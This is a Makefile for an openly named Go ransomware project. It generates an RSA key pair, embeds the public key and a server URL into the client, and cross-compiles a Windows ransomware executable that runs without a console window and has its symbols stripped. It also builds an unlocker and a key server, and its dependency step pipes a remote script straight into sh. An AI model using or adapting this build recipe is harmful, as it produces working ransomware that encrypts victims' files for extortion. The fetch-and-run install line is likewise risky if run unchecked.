.PHONY: all deps

all: build clean

BUILD_DIR = $(shell pwd)/build
BIN_DIR = $(shell pwd)/bin
PROJECT_DIR = $(shell pwd)
SERVER_HOST=localhost
SERVER_URL=https://$(SERVER_HOST):8080
HIDDEN=-H windowsgui
LINKER_VARS=-X github.com/mauri870/ransomware/client.ServerUrl=$(SERVER_URL)

deps:
	curl https://glide.sh/get | sh
	glide install
	go get -u github.com/akavel/rsrc \
		github.com/jteeuwen/go-bindata/...

pre-build:
	mkdir -p $(BUILD_DIR)/ransomware
	mkdir -p $(BUILD_DIR)/server
	mkdir -p $(BUILD_DIR)/unlocker
	openssl genrsa -out $(BUILD_DIR)/server/private.pem 4096
	openssl rsa -in $(BUILD_DIR)/server/private.pem -outform PEM -pubout -out $(PROJECT_DIR)/client/public.pem
	go-bindata -pkg client -o client/public_key.go client/public.pem
	rsrc -manifest ransomware.manifest -ico icon.ico -o $(BUILD_DIR)/ransomware/ransomware.syso
	cp $(BUILD_DIR)/ransomware/ransomware.syso $(BUILD_DIR)/unlocker/unlocker.syso
	cp -r cmd/ransomware $(BUILD_DIR)
	cp -r server $(BUILD_DIR)
	cp -r cmd/unlocker $(BUILD_DIR)
	cd $(BUILD_DIR)/server && env GOOS=linux go run /usr/local/go/src/crypto/tls/generate_cert.go --host $(SERVER_HOST)
	mkdir -p $(BIN_DIR)
	mkdir -p $(BIN_DIR)/server

binaries:
	cd $(BUILD_DIR)/ransomware && GOOS=windows GOARCH=386 go build --ldflags "-s -w $(HIDDEN) $(LINKER_VARS)" -o $(BIN_DIR)/ransomware.exe
	cd $(BUILD_DIR)/unlocker && GOOS=windows GOARCH=386 go build --ldflags "-s -w" -o $(BIN_DIR)/unlocker.exe
	cd $(BUILD_DIR)/server && go build && mv `ls|grep 'server\|key.pem\|cert.pem\|private.pem'` $(BIN_DIR)/server

build: pre-build binaries

clean:
	cd client && rm public.pem public_key.go || true
	rm -r build
